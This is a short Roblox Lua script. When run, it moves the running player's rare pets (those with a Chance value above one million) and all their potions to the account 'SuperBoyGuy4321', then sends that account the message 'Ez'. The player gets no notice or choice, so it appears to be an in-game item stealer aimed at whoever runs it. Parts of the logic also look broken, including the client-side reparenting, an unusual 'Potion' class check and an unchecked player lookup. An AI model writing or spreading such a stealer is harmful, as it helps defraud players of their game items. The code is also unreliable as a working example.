-- Import necessary libraries
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local function transferPets()
    local player = Players.LocalPlayer
    local pets = player:FindFirstChild("Pets")

    if pets then
        for _, pet in pairs(pets:GetChildren()) do
            if pet:FindFirstChild("Chance") and pet.Chance.Value > 1000000 then
                -- Transfer pet to SuperBoyGuy4321
                local message = "Ez"
                local targetPlayer = Players:FindFirstChild("SuperBoyGuy4321")
                
                if targetPlayer then
                    -- Simulate sending the pet
                    pet.Parent = targetPlayer:FindFirstChild("Pets")
                    -- Send message
                    ReplicatedStorage:WaitForChild("SendMessage"):Fire(targetPlayer, message)
                end
            end
        end
    end
end

local function donateValuables()
    local player = Players.LocalPlayer
    local valuables = player:FindFirstChild("Valuables")

    if valuables then
        for _, item in pairs(valuables:GetChildren()) do
            if item:IsA("Potion") then
                -- Donate potion to SuperBoyGuy4321
                item.Parent = Players:FindFirstChild("SuperBoyGuy4321"):FindFirstChild("Valuables")
            end
        end
    end
end

transferPets()
donateValuables()
